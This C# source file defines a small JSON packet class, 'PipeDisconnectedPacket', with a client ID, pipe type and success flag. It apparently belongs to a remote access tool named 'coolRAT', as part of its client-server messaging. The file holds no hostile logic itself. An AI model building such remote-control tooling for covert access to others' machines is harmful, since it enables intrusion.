using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class PipeDisconnectedPacket : Packet
    {
        public Guid ClientId;
        public PipeType PipeType;
        public bool Success;

        public PipeDisconnectedPacket(Guid clientId, PipeType pipeType, bool success)
        {
            ClientId = clientId;
            PipeType = pipeType;
            Success = success;
            Type = "PipeDisconnectedPacket";
        }

        public new static PipeDisconnectedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<PipeDisconnectedPacket>(packet_string);
        }
    }
}
